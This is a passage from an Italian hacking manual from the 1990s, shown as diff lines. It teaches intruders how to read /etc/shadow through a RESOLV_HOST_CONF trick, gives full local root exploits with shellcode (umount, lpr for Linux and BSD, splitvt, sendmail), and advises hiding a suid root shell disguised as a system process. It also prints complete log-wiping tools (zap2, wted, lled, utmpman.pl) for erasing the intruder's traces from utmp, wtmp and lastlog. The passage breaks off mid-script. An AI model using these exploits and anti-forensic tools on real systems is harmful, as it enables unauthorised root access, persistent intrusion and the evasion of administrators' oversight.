+3. Digita uno dei nomi dei file qui sopra con asdf ,in questo modo:
+
+ping asdf
+
+Dovrebbe trovare il shadow passwd file per te ,se funziona. Sembra che 
+funzioni sulla maggioranza dei sistemi attualmente.
+
+Nota: Puoi sostituire /etc/passwd con qualunque file posseduto da ROOT che tu 
+voglia leggere.
+
+Ecco un veloce script che puoi lanciare su qualunque file per rendere il tutto 
+piu' semplice:
+
+rcb.c
+-------- cut here
+
+/* RCB Phraser - therapy in '96
+ * Limits: Linux only, no binary files.
+ * little personal message to the world: FUCK CENSORSHIP!
+ */
+
+#include <stdio.h>
+
+void getjunk(const char *filetocat)
+{ setenv("RESOLV_HOST_CONF",filetocat,1);
+  system("ping xy 1> /dev/null 2> phrasing");
+  unsetenv("RESOLV_HOST_CONF");
+}
+
+void main(argc,argv)
+int argc; char **argv;
+{ char buffer[200];
+  char *gag;
+  FILE *devel;
+  
+  if((argc==1) || !(strcmp(argv[1],"-h")) || !(strcmp(argv[1],"--help")))
+  { printf("RCB Phraser - junked by THERAPY\n\n");
+    printf("Usage: %s [NO OPTIONS] [FILE to cat]\n\n",argv[0]);
+    exit(1);
+  }
+  getjunk(argv[1]);
+  gag=buffer;
+  gag+=10;
+  devel=fopen("phrasing","rb");
+  while(!feof(devel))
+  { fgets(buffer,sizeof(buffer),devel);
+    if(strlen(buffer)>24)
+    { strcpy(buffer+strlen(buffer)-24,"\n");
+      fputs(gag,stdout);
+    }
+  }
+  fclose(devel);
+  remove("phrasing");
+}
+
+-------------- cut here
+
+riga di comando: rcb /etc/shadow o qualunque altro file sul sistema che non puoi 
+leggere ;)
+
+--------------------
+Sezione 3D
+Ottenere /etc/hosts
+--------------------
+
+Solo una precauzione, qualche volta ti servira' sapere cosa siano i vari sistemi 
+nell'host file, o cosa siano tutti gli indirizzi ip o i differenti domini nel 
+sistema. Assicurati di recuperare il file /etc/hosts per maggiori informazioni 
+di cui potresti aver bisogno in futuro.
+
+---------------------------
+Capitolo IV
+Guadagna l'account di root
+---------------------------
+Come ho detto prima, nella maggior parte dei casi, tutto cio' che hai bisogno e'
+un account e se non riesci ad averlo potresti scambiarlo con qualcuno in
+qualche IRC (c'e' sempre qualcuno che vuole farsi notare). In questo manuale ci 
+sono info sufficienti e se nonostante questo non riesci a guadagnare l'account 
+di root vuol dire che quel sistema e' sicuro e lo sara' probabilmente anche in 
+futuro.
+Ma non scoraggiarti. Puoi sempre tenere le informazioni su quel sistema da 
+parte,scrivere qualche appunto e aspettare che esca qualche nuovo exploit.
+
+Cerca di stare fuori dal sistema fino a quel momento in modo da non perdre 
+l'account. Ricorda che quando ti logghi in un account e non hai i permessi
+di root, non puoi cancellare i file di log, quindi quando l'utente proprietario
+dell'account si logghera' a sua volta vedra' un messaggio che dice:
+
+last login from xxx.com time:0:00 date:xx/xx/xx
+
+In questo modo potrebbe scoprire che qualcuno si e' loggato col suo account.
+
+-----------
+Sezione 4A
+Bugs
+-----------
+Ci sono molti bug nei programmi di un sistema che ti permettono di avere 
+l'accesso a root. Puo' essere un gioco installato sul sistema oppure il sendmail. 
+Se loro non aggiornano il sistema con nuove patch stai pur certo che prima o poi 
+entri dentro come root.
+
+Insieme a questo manuale noi della IHS abbiamo riportato molti exploit per UNIX, 
+HP-UNIX e Linux. (ce ne sara' uno che funziona...).
+Mi raccomando finisci di leggere il manuale prima di iniziare una intrusione
+altrimenti rischi di farti beccare oppure di restare nel sistema per lungo
+tempo senza combinare nulla.
+
+-----------
+Sezione 4B
+Exploits
+-----------
+Adesso presentiamo alcuni exploit molto comuni che in un sistema appena decente
+non funzioneranno. Il nostro intento, pero', e' quello di farvi vedere come 
+funziona un exploit e questi esempi ci parevano molto istruttivi.
+
+umount/mount exploit
+
+Cerca nella directory /bin un file chiamato umount(o mount),se non lo trovi cercalo 
+nel sistema cosi':
+
+find / -name umount -print -xdev
+
+Vai nella directory dove si trova il file e digita:
+
+ls -al um*
+
+Se questo file ha permessi suid allora probabilmente diventerai root.
+I permessi suid sono: rws per il proprietario che e' root. Praticamente
+cosi':
+
+victim:/bin# ls -al um*
+-rwsr-sr-x   1 root         8888 Mar 21  1995 umount
+victim:/bin#
+
+Possiamo diventare root compilando il file qui sotto:
+
+umount.c
+------ cut here
+
+/* sno.c : Linux realpath exploit
+ * Syntax: ./sno N
+ *         mount $WOOT 
+ *    OR  umount $WOOT
+ * N is some number which seems to differ between 4 & 8, if your number is
+ * too big, you will get a mount error, if it is too small, it will seg
+ * fault.  Figure it out.  (Sometimes N=0 for mount)
+ * If you use mount, first thing to do once you get the root shell is rm 
+ * /etc/mtab~, if this file exists you can't root with mount until it is 
+ * removed.
+ * 
+ *
+ *                                          -ReDragon
+ */
+#define SIZE 1024
+
+   long get_esp(void)
+   {
+   __asm__("movl %esp,%eax\n");
+   }
+
+   main(int argc, char **argv)
+   {
+   char env[SIZE+4+1]; /* 1024 buffer + 4 byte return address + null byte */
+   int a,r;
+   char *ptr;
+   long *addr_ptr;
+   char execshell[] =
+   "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
+   "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
+   "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
+   char *exec_ptr = execshell;
+
+   r=atoi(argv[1]);  
+   ptr = env;
+   memcpy(ptr,"WOOT=",5); /* set environment variable to use */
+   ptr += 5;              
+
+   for(a=0;a<SIZE+4-strlen(execshell)-r;a++)  /* pad front with NOPs */
+      *(ptr++) = 0x90;
+   while (*exec_ptr)
+      *(ptr++) = *(exec_ptr++);
+   addr_ptr = (long *)ptr;
+   *(addr_ptr++) = get_esp()+1139;  /* 0xbffffc01 */
+
+   ptr = (char *) addr_ptr;  
+   *ptr = 0; /* must end with null byte to terminate string */
+   putenv(env);
+   system("/bin/mount $WOOT");
+}
+
+----------- cut here
+************************************
+Per compilare il file nella macchina vittima digita : gcc umount.c -o um (o
+come vuoi chiamarlo)
+
+In questo modo creerai un file chiamato um che puoi eseguire. 
+Con questo exploit devi dare un numero come:
+./um 0 oppure ./um 4 .... fino all'8 
+*********************************************
+
+Se fallisci potresti provare lpr. Cerca in /usr/bin lpr e controlla se ha i 
+permessi suid...
+ls -l lpr
+Ok ha i permessi suid... Usa questo script
+
+*************************************
+lpr.linux.c
+------------- cut here
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#define DEFAULT_OFFSET          50
+#define BUFFER_SIZE             1023
+
+long get_esp(void)
+{
+   __asm__("movl %esp,%eax\n");
+}
+
+void main()
+{
+   char *buff = NULL;
+   unsigned long *addr_ptr = NULL;
+   char *ptr = NULL;
+
+   u_char execshell[] = "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07"
+                        "\x89\x56\x0f\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12"
+                        "\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80\xe8"
+                        "\xd7\xff\xff\xff/bin/sh";
+   int i;
+
+   buff = malloc(4096);
+   if(!buff)
+   {
+      printf("can't allocate memory\n");
+      exit(0);
+   }
+   ptr = buff;
+   memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));
+   ptr += BUFFER_SIZE-strlen(execshell);
+   for(i=0;i < strlen(execshell);i++)
+      *(ptr++) = execshell[i];
+   addr_ptr = (long *)ptr;
+   for(i=0;i<2;i++)
+      *(addr_ptr++) = get_esp() + DEFAULT_OFFSET;
+   ptr = (char *)addr_ptr;
+   *ptr = 0;
+   execl("/usr/bin/lpr", "lpr", "-C", buff, NULL);
+}
+---------- cut here
+****************************
+Questa e' la versione per BSD
+****************************
+
+lpr.bsd.c
+--------------------------------------------------------- cut here
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#define DEFAULT_OFFSET          50
+#define BUFFER_SIZE             1023
+
+long get_esp(void)
+{
+   __asm__("movl %esp,%eax\n");
+}
+
+void main()
+{
+   char *buff = NULL;
+   unsigned long *addr_ptr = NULL;
+   char *ptr = NULL;
+
+   char execshell[] =
+   "\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07\x89\x56\x0f"
+   "\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b\x8d\x4e\x0b\x89\xca\x52"
+   "\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01"
+   "\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04";
+
+   int i;
+
+   buff = malloc(4096);
+   if(!buff)
+   {
+      printf("can't allocate memory\n");
+      exit(0);
+   }
+   ptr = buff;
+   memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));
+   ptr += BUFFER_SIZE-strlen(execshell);
+   for(i=0;i < strlen(execshell);i++)
+      *(ptr++) = execshell[i];
+   addr_ptr = (long *)ptr;
+   for(i=0;i<2;i++)
+      *(addr_ptr++) = get_esp() + DEFAULT_OFFSET;
+   ptr = (char *)addr_ptr;
+   *ptr = 0;
+   execl("/usr/bin/lpr", "lpr", "-C", buff, NULL);
+}
+--------- cut here
+
+Adesso basta compilarlo a fare: chmod nomeprg +x ed eseguirlo
+
+Osserva il proprietario del gruppo. Tutti i file che copierai avranno
+come proprietario lp, assicurati di cambiare il gruppo di ogni file che
+scrivi.(chgrp root filename). Conrolla sempre il proprietario con ls -l.
+
+E' una buona idea utilizzare questo exploit SOLO per guadagnare l'accesso
+come root, dopodiche' basta copiare bash o sh (o quella che vuoi) con un 
+altro nome da qualche altra parte e renderla root con suid di root. Poi
+digita chmod nomefile +s
+
+In questo modo in futuro avrai accesso come root con gid e uid di root 
+senza usare l'lp. Assicurati di rinominare la shell in modo tale da farla
+sembrare un processo di sistema (se l'amministratore controlla che processi
+di root stanno girando, non si deve accorgere della nostra shell)
+***************************************************
+
+Questo e' un altro exploit che agisce su /usr/bin/splitvt
+Se questo comando ha i permessi suid compila il programma qui sotto
+
+****************************************
+sp.c
+-------------------------------------------- cut here
+/*
+ *            Avalon Security Research
+ *			    Release 1.3
+ *			     (splitvt)
+ *
+ * Affected Program: splitvt(1)
+ *
+ * Affected Operating Systems: Linux 2-3.X
+ *
+ * Exploitation Result: Local users can obtain superuser privileges.
+ *
+ * Bug Synopsis: A stack overflow exists via user defined unbounds checked
+ * user supplied data sent to a sprintf(). 
+ *
+ * Syntax: 
+ * crimson~$ cc -o sp sp.c
+ * crimson~$ sp
+ * bash$ sp
+ * bash$ splitvt
+ * bash# whoami
+ * root
+ *
+ * Credit: Full credit for this bug (both the research and the code)
+ * goes to Dave G. & Vic M.  Any questions should be directed to
+ * mcpheea@cadvision.com . 
+ *
+ * ----------------------------------------------------------------------------
+ */
+
+
+long get_esp(void)
+{
+__asm__("movl %esp,%eax\n");
+}
+main()
+{
+  char eggplant[2048];
+  int a;
+  char *egg;
+  long *egg2;
+  char realegg[] =
+"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
+"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
+"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
+  char *eggie = realegg;
+
+  egg = eggplant;
+
+  *(egg++) = 'H';
+  *(egg++) = 'O';
+  *(egg++) = 'M';
+  *(egg++) = 'E';
+  *(egg++) = '=';
+
+  egg2 = (long *)egg;
+
+  for (a=0;a<(256+8)/4;a++) *(egg2++) = get_esp() + 0x3d0 + 0x30;
+
+  egg=(char *)egg2;
+
+  for (a=0;a<0x40;a++) *(egg++) = 0x90;
+
+  while (*eggie)
+    *(egg++) = *(eggie++);
+  *egg = 0; /* terminate eggplant! */
+
+  putenv(eggplant);
+
+  system("/bin/bash");
+}
+
+-------------- cut here
+
+Ok, slitvt lavora in questo modo:
+
+1. Complia il file
+2. Fai girare il file sp
+3. Lancia splitvt
+
+Prima di lanciare splitvt digita:	whoami
+					username
+
+Dopo che hai lanciato l'exploit digita:	whoami
+					root
+****************************************************************
+
+Adesso se non sei riuscito ad avere root, prova con sm.sh.
+Questo e' un bug di sendmail che funziona con la versione 8.73 fino alla
+8.83 (forse anche altre).
+Questo e' lo script:
+
+sm.sh
+---------- cut here
+echo   'main()                                                '>>smtpd.c
+echo   '{                                                     '>>smtpd.c
+echo   '  setuid(0); setgid(0);                               '>>smtpd.c
+echo   '  system("cp /bin/sh /tmp;chmod a=rsx /tmp/sh");      '>>smtpd.c
+echo   '}                                                     '>>smtpd.c
+echo   'main()                                                '>>leshka.c
+echo   '{                                                     '>>leshka.c
+echo   '  execl("/usr/sbin/sendmail","/tmp/smtpd",0);         '>>leshka.c
+echo   '}                                                     '>>leshka.c
+
+cc -o leshka leshka.c;cc -o /tmp/smtpd smtpd.c
+./leshka
+kill -HUP `ps -ax|grep /tmp/smtpd|grep -v grep|tr -d ' '|tr -cs "[:digit:]" 
+"\n"|head -n 1`
+rm leshka.c leshka smtpd.c /tmp/smtpd
+cd /tmp
+sh
+------------ cut here
+
+Dopo aver scritto lo script digita:
+chmod +x sm.sh
+
+1. Lancia il file
+2. Esso ti porta nella directory /tmp
+3. Digita ls -l e controlla se c'e' un file sh con suid, e se c'e' digita
+   whoami, se non sei root lancia il file ./sh, adesso controlla se
+   sei root ;)
+
+Questi sono solo alcuni. Allegato a questo manuale e' presente il libro 
+degli exploit che potrete utilizzare per avere accessi di root o altro!!
+Buon divertimento.
+
+-------------------
+Capitolo V
+Renditi invisibile
+-------------------
+
+Questi stuff servono per mantenere l'acesso a piu' punti di informazioni 
+possibili.
+Se fai delle stupidate, o non riesci a cancellare i tuoi wtmp, xferlog, ecc...
+puoi perdre l'accesso al sistema. Quindi devi assolutamente imparare come
+funziona ogni sistema che hackeri.
+
+Diventa parte del sistema, e prendi nota se stai lavorando su piu' sistemi in
+una volta sola. Ma ricorda, costruisciti una routine ed evita di perdre tempo
+nel cancellare le tue tracce. Non sbagliare a cancellare le tue tracce, 
+altrimenti rischi di perdere l'accesso e di farti beccare.
+
+-----------------------------
+Sezione 5A
+Zap2 (per wtmp/lastlog/utmp)
+-----------------------------
+
+Ci sono diversi programmi che cancellano le tue tracce, ma il migliore secondo
+me e' zap2. Il mio l'ho compilato chiamandolo z2.
+
+z2 viene lanciato non appena hai guadagnato l'accesso a root.
+
+Potresti voler fare un finger @host.xxx per vedere chi e' collegato e 
+guardare l'idle time di root o degli account dell'amministratore per vedere
+se stanno facendo qualcosa.
+
+Loggati e non appena sei dentro digita w, per vedere l'idle time di chi c'e', ma
+contemporaneamente lancia il comando per avere l'accesso a root che
+avrai nacosto in qualche directory nidificata. Non appena avrai l'accesso a
+root, digita ./z2 username.
+
+Adesso sei al sicuro. Digita w pe rassicurarti che non ci sei. Se devi fare
+ftp o altre cose devi usare altri programmi che ho incluso nella prossima
+sezione chiamati wted e lled.
+
+Ma continuiamo con z2. Devi vedere dove si trovano tutti i file di log nel 
+sistema ed editare z2.c in modo da includere la giusta locazione dei file.
+
+#define WTMP_NAME "/usr/adm/wtmp"
+#define UTMP_NAME "/etc/utmp"
+#define LASTLOG_NAME "/usr/adm/lastlog"
+
+Nella magior parte dei sistemi in cui sono entrato erano
+
+#define WTMP_NAME "/var/adm/wtmp"
+#define UTMP_NAME "/var/adm/utmp"
+#define LASTLOG_NAME "/var/adm/lastlog"
+
+oppure in /bvar/log
+
+Questo e' il sorgente di zap2.c
+
+--------------------------- cut here
+#include <sys/types.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/file.h>
+#include <fcntl.h>
+#include <utmp.h>
+#include <pwd.h>
+#include <lastlog.h>
+#define WTMP_NAME "/usr/adm/wtmp"
+#define UTMP_NAME "/etc/utmp"
+#define LASTLOG_NAME "/usr/adm/lastlog"
+ 
+int f;
+ 
+void kill_utmp(who)
+char *who;
+{
+    struct utmp utmp_ent;
+ 
+  if ((f=open(UTMP_NAME,O_RDWR))>=0) {
+     while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
+       if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
+                 bzero((char *)&utmp_ent,sizeof( utmp_ent ));
+                 lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
+                 write (f, &utmp_ent, sizeof (utmp_ent));
+            }
+     close(f);
+  }
+}
+ 
+void kill_wtmp(who)
+char *who;
+{
+    struct utmp utmp_ent;
+    long pos;
+ 
+    pos = 1L;
+    if ((f=open(WTMP_NAME,O_RDWR))>=0) {
+ 
+     while(pos != -1L) {
+        lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
+        if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
+          pos = -1L;
+        } else {
+          if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
+               bzero((char *)&utmp_ent,sizeof(struct utmp ));
+               lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
+               write (f, &utmp_ent, sizeof (utmp_ent));
+               pos = -1L;
+          } else pos += 1L;
+        }
+     }
+     close(f);
+  }
+}
+ 
+void kill_lastlog(who)
+char *who;
+{
+    struct passwd *pwd;
+    struct lastlog newll;
+ 
+     if ((pwd=getpwnam(who))!=NULL) {
+ 
+        if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
+            lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
+            bzero((char *)&newll,sizeof( newll ));
+            write(f, (char *)&newll, sizeof( newll ));
+            close(f);
+        }
+ 
+    } else printf("%s: ?\n",who);
+}
+ 
+main(argc,argv)
+int argc;
+char *argv[];
+{
+    if (argc==2) {
+        kill_lastlog(argv[1]);
+        kill_wtmp(argv[1]);
+        kill_utmp(argv[1]);
+        printf("Zap2!\n");
+    } else
+    printf("Error.\n");
+}
+--------------------------- cut here
+
+----------------
+Sezione 5B
+Altri script
+----------------
+Dopo che ti sei connesso e hai lanciato z2, potresti aver bisogno di fare un
+ftp per prendere qualche file. (RICORDA, MAI ftp o telnet al di fuori)
+Ok, per fare un ftp dentro o un login in un altro account nel sistema devi
+usare wted. Wted editera' il wtmp per rimuovere i tuoi login dall'ftp.
+Devi usare anche lled (lastlog edit) per essere al sicuro.
+
+Questo e' il men- che appare se digiti ./wted, dopo aver settato il path dei log
+e aver compilato:
+
+[8:25pm][/home/compile]wted
+Usage: wted -h -f FILE -a -z -b -x -u USER -n USER -e USER -c HOST
+            -h      This help
+            -f      Use FILE instead of default
+            -a      Show all entries found
+            -u      Show all entries for USER
+            -b      Show NULL entries
+            -e      Erase USER completely
+            -c      Erase all connections containing HOST
+            -z      Show ZAP'd entries
+            -x      Attempt to remove ZAP'd entries completely
+
+Quindi se faccio un ftp come utente tsmith dovro' digitare wted -x -e tsmith
+
+Il programma ti chiedera' per ogni log di tsmith se vuoi cancellarlo. Dopo che
+hai cancellato il tuo login , assicurati di chmod 644 il file wtmp.tmp e 
+copiarlo sopra il file wtmp nella directory di log. Puoi farlo in questo modo:
+
+1. chmod 644 wtmp.tmp
+2. cp wtmp.tmp /var/adm/wtmp
+
+Questo e' il wted.c
+
+ASSICURATI DI INSERIRE IL PATH CORRETTO dei file sottoindicati!!
+
+wted.c
+---------------------- cut here
+#include <stdio.h>
+#include <utmp.h>
+#include <time.h>
+#include <fcntl.h>
+
+char *file="/var/adm/wtmp";
+
+main(argc,argv)
+int argc;
+char *argv[];
+{
+int i;
+if (argc==1) usage();
+for(i=1;i<argc;i++)
+	{
+	if(argv[i][0] == '-')
+		{
+		switch(argv[i][1])
+			{
+			case 'b': printents(""); break;
+			case 'z': printents("Z4p"); break;
+			case 'e': erase(argv[i+1],0); break;
+			case 'c': erase(0,argv[i+1]); break;
+			case 'f': file=argv[i+1]; break;
+			case 'u': printents(argv[i+1]); break;
+			case 'a': printents("*"); break;
+			case 'x': remnull(argv[i+1]); break;
+			default:usage();
+			}
+		}
+	}
+}
+
+printents(name)
+char *name;
+{
+struct utmp utmp,*ptr;
+int fp=-1;
+ptr=&utmp;
+if (fp=open(file,O_RDONLY))
+	{
+	while (read(fp,&utmp,sizeof(struct utmp))==sizeof(struct utmp))
+		{
+		if ( !(strcmp(name,ptr->ut_name)) || (name=="*") ||
+		(!(strcmp("Z4p",name)) && (ptr->ut_time==0)))
+			printinfo(ptr);
+		}
+	close(fp);
+	}
+}
+
+printinfo(ptr)
+struct utmp *ptr;
+{
+char tmpstr[256];
+printf("%s\t",ptr->ut_name);
+printf("%s\t",ptr->ut_line);
+strcpy(tmpstr,ctime(&(ptr->ut_time)));
+tmpstr[strlen(tmpstr)-1]='\0';
+printf("%s\t",tmpstr);
+printf("%s\n",ptr->ut_host);
+}
+
+erase(name,host)
+char *name,*host;
+{
+int fp=-1,fd=-1,tot=0,cnt=0,n=0;
+struct utmp utmp;
+unsigned char c;
+if (fp=open(file,O_RDONLY)) {
+        fd=open("wtmp.tmp",O_WRONLY|O_CREAT);
+        while (read(fp,&utmp,sizeof(struct utmp))==sizeof(struct utmp)) {
+		if (host)
+			if (strstr(utmp.ut_host,host)) tot++;
+			else {cnt++;write(fd,&utmp,sizeof(struct utmp));}
+		if (name) {
+                if (strcmp(utmp.ut_name,name)) {cnt++;
+			write(fd,&utmp,sizeof(struct utmp));}
+		else { 
+			if (n>0) {
+				n--;cnt++;
+				write(fd,&utmp,sizeof(struct utmp));}
+			else
+			{
+			printinfo(&utmp);
+			printf("Erase entry (y/n/f(astforward))? ");
+			c='a';
+			while (c!='y'&&c!='n'&&c!='f') c=getc(stdin);
+			if (c=='f') {
+				cnt++;
+				write(fd,&utmp,sizeof(struct utmp));
+				printf("Fast forward how many entries? ");
+				scanf("%d",&n);}
+			if (c=='n') {
+				cnt++;
+				write(fd,&utmp,sizeof(struct utmp));
+				}
+			if (c=='y') tot++;
+			} 
+		      }	}					
+        }
+        close(fp);
+        close(fd);
+        }
+printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
+printf("Now chmod wtmp.tmp and copy over the original %s\n",file);
+}
+
+remnull(name)
+char *name;
+{
+int fp=-1,fd=-1,tot=0,cnt=0,n=0;
+struct utmp utmp;
+if (fp=open(file,O_RDONLY)) {
+        fd=open("wtmp.tmp",O_WRONLY|O_CREAT);
+        while (read(fp,&utmp,sizeof(struct utmp))==sizeof(struct utmp)) {
+		if (utmp.ut_time) {
+			cnt++;
+			write(fd,&utmp,sizeof(struct utmp));
+		}
+		else
+			tot++;
+	}
+        close(fp);
+        close(fd);
+        }
+printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
+printf("Now chmod wtmp.tmp and copy over the original %s\n",file);
+}
+
+usage()
+{
+printf("Usage: wted -h -f FILE -a -z -b -x -u USER -n USER -e USER -c HOST\n");
+printf("\t-h\tThis help\n");
+printf("\t-f\tUse FILE instead of default\n");
+printf("\t-a\tShow all entries found\n");
+printf("\t-u\tShow all entries for USER\n");
+printf("\t-b\tShow NULL entries\n"); 
+printf("\t-e\tErase USER completely\n");
+printf("\t-c\tErase all connections containing HOST\n");
+printf("\t-z\tShow ZAP'd entries\n");
+printf("\t-x\tAttempt to remove ZAP'd entries completely\n");
+}
+---------------------- cut here
+
+Bisogna, pero', eliminare anche i riferimenti nel file /var/adm/lastlog
+Per far cio' si usa lled.c. Compila il programma e chiamalo lled
+Questo e' il men- che appare chiamando ./lled
+[4:04am][/home/paris/compile]lled
+Usage: lled -h -f FILE -a -z -b -x -u USER -n USER -e USER -c HOST
+-h      This help
+-f      Use FILE instead of default
+-a      Show all entries found
+-u      Show all entries for USER
+-b      Show NULL entries
+-e      Erase USER completely
+-c      Erase all connections containing HOST
+-z      Show ZAP'd entries
+-x      Attempt to remove ZAP'd entries completely
+
+
+Se l'host dal quale ti sei collegato si chiama machine.edit.com, digita:
+
+lled -e username -c machine.edit
+
+Se hai bisogno di vedere il riferimento al tuo host nel logfile (dovrebbe 
+essere alla fine del file) digita: lled -a
+
+chmod il file lastlog.tmp a 644 e copia il file sopra il lastlog nella
+directory di log come hai fatto per wted.
+
+ASSICURATI di cambiare il path del lastlog
+
+Questo e' lled.c
+-------------------------- cut here
+#include <stdio.h>
+#include <time.h>
+#include <lastlog.h>
+#include <fcntl.h>
+
+char *file="/var/adm/lastlog";
+
+main(argc,argv)
+int argc;
+char *argv[];
+{
+int i;
+if (argc==1) usage();
+for(i=1;i<argc;i++)
+	{
+	if(argv[i][0] == '-')
+		{
+		switch(argv[i][1])
+			{
+			case 'b': printents(""); break;
+			case 'z': printents("Z4p"); break;
+			case 'e': erase(argv[i+1]); break;
+                        case 'c': erase(0,argv[i+1]); break;
+			case 'f': file=argv[i+1]; break;
+			case 'u': printents(argv[i+1]); break;
+			case 'a': printents("*"); break;
+			case 'x': remnull(argv[i+1]); break;
+			default:usage();
+			}
+		}
+	}
+}
+
+printents(name)
+char *name;
+{
+struct lastlog utmp,*ptr;
+int fp=-1;
+ptr=&utmp;
+if (fp=open(file,O_RDONLY))
+	{
+	while (read(fp,&utmp,sizeof(struct lastlog))==sizeof(struct lastlog))
+		{
+		if ( !(strcmp(name,ptr->ll_line)) || (name=="*") ||
+		(!(strcmp("Z4p",name)) && (ptr->ll_time==0)))
+			printinfo(ptr);
+		}
+	close(fp);
+	}
+}
+
+printinfo(ptr)
+struct lastlog *ptr;
+{
+char tmpstr[256];
+printf("%s\t",ptr->ll_line);
+strcpy(tmpstr,ctime(&(ptr->ll_time)));
+tmpstr[strlen(tmpstr)-1]='\0';
+printf("%s\t",tmpstr);
+printf("%s\n",ptr->ll_host);
+}
+
+erase(name,host)
+char *name,*host;
+{
+int fp=-1,fd=-1,tot=0,cnt=0,n=0;
+struct lastlog utmp;
+unsigned char c;
+if (fp=open(file,O_RDONLY)) {
+        fd=open("lastlog.tmp",O_WRONLY|O_CREAT);
+        while (read(fp,&utmp,sizeof(struct lastlog))==sizeof(struct lastlog)) {
+                if (host)
+                        if (strstr(utmp.ll_host,host)) tot++;
+                        else {cnt++;write(fd,&utmp,sizeof(struct lastlog));}
+                if (name) {
+		if (strcmp(utmp.ll_line,name)) {cnt++;
+			write(fd,&utmp,sizeof(struct lastlog));}
+		else { 
+			if (n>0) {
+				n--;cnt++;
+				write(fd,&utmp,sizeof(struct lastlog));}
+			else
+			{
+			printinfo(&utmp);
+			printf("Erase entry (y/n/f(astforward))? ");
+			c='a';
+			while (c!='y'&&c!='n'&&c!='f') c=getc(stdin);
+			if (c=='f') {
+				cnt++;
+				write(fd,&utmp,sizeof(struct lastlog));
+				printf("Fast forward how many entries? ");
+				scanf("%d",&n);}
+			if (c=='n') {
+				cnt++;
+				write(fd,&utmp,sizeof(struct lastlog));
+				}
+			if (c=='y') tot++;
+			} 
+		      }	}					
+        }
+        close(fp);
+        close(fd);
+        }
+printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
+printf("Now chmod lastlog.tmp and copy over the original %s\n",file);
+}
+
+remnull(name)
+char *name;
+{
+int fp=-1,fd=-1,tot=0,cnt=0,n=0;
+struct lastlog utmp;
+if (fp=open(file,O_RDONLY)) {
+        fd=open("lastlog.tmp",O_WRONLY|O_CREAT);
+        while (read(fp,&utmp,sizeof(struct lastlog))==sizeof(struct lastlog)) {
+		if (utmp.ll_time) {
+			cnt++;
+			write(fd,&utmp,sizeof(struct lastlog));
+		}
+		else
+			tot++;
+	}
+        close(fp);
+        close(fd);
+        }
+printf("Entries stored: %d Entries removed: %d\n",cnt,tot);
+printf("Now chmod lastlog.tmp and copy over the original %s\n",file);
+}
+
+usage()
+{
+printf("Usage: lled -h -f FILE -a -z -b -x -u USER -n USER -e USER -c HOST\n");
+printf("\t-h\tThis help\n");
+printf("\t-f\tUse FILE instead of default\n");
+printf("\t-a\tShow all entries found\n");
+printf("\t-u\tShow all entries for USER\n");
+printf("\t-b\tShow NULL entries\n"); 
+printf("\t-e\tErase USER completely\n");
+printf("\t-c\tErase all connections containing HOST\n");
+printf("\t-z\tShow ZAP'd entries\n");
+printf("\t-x\tAttempt to remove ZAP'd entries completely\n");
+}
+---------------------------------------------------------------- cut here
+
+Esiste un buon perl script per editare utmp, wtmp, e controllare i processi.
+Con wted e' anche possibile inserire una linea. cosi' se vuoi giocare un 
+po',puoi aggiungere clinton.whitehouse.gov loggato nella porta ttyp3 e far vedere
+che e' stato loggato per qualche ora.
+
+Facendo girare "check", saprai se qualcuno e' nel sistema e non si vede nel
+utmp log. Alle volte gli amministratori si nascondono. In questo modo potrai
+vedere se sono collegati. Devi essere root per far girare lo script e c'e'
+bisogno di perl 5.003+ sul sistema. Prima di far partire lo script vediamo
+l'help.
+Qui ci sono alcuni dei comandi base:
+
+starts by loading wtmp
+
+delete user username
+delete host hostanme
+write
+
+read wtmp
+delete user username
+delete host hostname
+write
+
+chiama l'help per il resto.
+
+-----------------------start of utmpman.pl
+#!/usr/bin/perl -w
+#
+# Variable defines.
+my($utmp_location) = "/var/run/utmp";
+my($wtmp_location) = "/var/log/wtmp";
+my($shells_location) = "/etc/shells";
+my($ttybase) = "tty";
+my($ttyrange) = "pqrs";                 # TTYrange standard on most linux 
+systems.
+my($ttyports) = "012345657689abcfef";   # TTYports standard on most linux 
+systems.
+
+# Global initializations.
+my($active_file) = "";
+my(%entries) = {};
+my(@cmdline) = ();
+my(@shells) = ();
+
+# Display banner.
+print "\nutmp Manager v0.8\n\n";
+
+# Access check.
+die("utmpman :: You must be root to run this application!\n") unless ($> == 0);
+
+# Read in valid shells.
+if (defined($shells_location)) {
+  open(SHELLFILE, "<$shells_location");
+  @shells = <SHELLFILE>;
+  close(SHELLFILE);
+}
+# Process "basename" of each shell.
